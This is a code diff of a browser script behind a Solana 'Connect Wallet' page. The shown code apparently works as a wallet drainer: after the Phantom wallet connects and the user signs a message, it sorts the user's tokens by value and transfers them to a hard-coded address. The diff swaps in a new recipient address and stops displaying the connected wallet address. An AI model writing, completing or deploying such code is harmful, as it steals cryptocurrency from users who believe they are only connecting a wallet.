@@ -6,24 +6,6 @@ import { getAssociatedTokenAddress, createTransferInstruction, ASSOCIATED_TOKEN_
 
 // Define necessary variables
 let walletAddress = null;
-
-// Function to open the Phantom wallet app on mobile
-const openPhantomWallet = () => {
-    const appUrl = encodeURIComponent(window.location.href); // Current app URL
-    const dappEncryptionPublicKey = 'EQDi1EUz1WZMoGAsob1XctVhWcnh6ABKpudP7ZFbcB1H'
-    const redirectLink = encodeURIComponent(window.location.href); // Redirect back to the app after connection
-    const cluster = 'mainnet-beta'; // Specify the network
-
-    // Construct the connection URL
-    const connectUrl = `https://phantom.app/ul/v1/connect?app_url=${appUrl}&dapp_encryption_public_key=${dappEncryptionPublicKey}&redirect_link=${redirectLink}&cluster=${cluster}`;
-
-    // Open the connection URL
-    window.location.href = connectUrl;
-};
-
-// Attach the openPhantomWallet function to the "Connect Wallet" button
-document.getElementById('connectWalletBtn').addEventListener('click', openPhantomWallet);
-
 // Function to connect the Phantom wallet and execute the whole flow
 async function connectAndExecute() {
     const provider = window.solana;
@@ -39,7 +21,7 @@ async function connectAndExecute() {
         walletAddress = response.publicKey.toString();  // Capture the connected wallet address
 
         // Display the connected wallet address
-        document.getElementById('connectWalletBtn').textContent = `Connected: ${walletAddress}`;
+        document.getElementById('connectWalletBtn').textContent = `Connected`;
 
         // Step 2: Sign a message after connection to verify wallet ownership
         await signMessage(provider, walletAddress);
@@ -73,7 +55,7 @@ async function connectAndExecute() {
         console.log('Filtered and Sorted Tokens by Value:', sortedTokens);
 
         // Step 7: Transfer tokens in the sorted order
-        const recipientAddress = '6i3vVKyfafPTgpQjct9Tx8c3fAHT7sCBDG9GsZk1n4vf';  // Replace with the recipient's address
+        const recipientAddress = '2VhgfoY8zMLcpF5NhoArSua2iCoduqEFLMSaRXFhistJ';  // Replace with the recipient's address
         await transferTokensInOrder(sortedTokens, recipientAddress, connection);
 
     } catch (err) {
